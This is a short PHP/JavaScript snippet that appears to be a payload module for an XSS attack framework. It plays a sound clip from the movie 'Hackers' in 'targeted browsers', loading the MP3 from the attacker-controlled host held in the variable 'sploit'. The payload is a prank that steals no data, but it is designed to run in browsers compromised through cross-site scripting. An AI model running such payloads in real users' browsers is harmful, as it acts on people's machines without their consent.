<?php
# Send sound clip from the movie hackers to the targeted browsers.
?> 
debug("start audio hack");
var xssurl = "http://"+sploit+"/hkhack.mp3";
var audio = new Audio(xssurl);
audio.play();
debug("audio played");
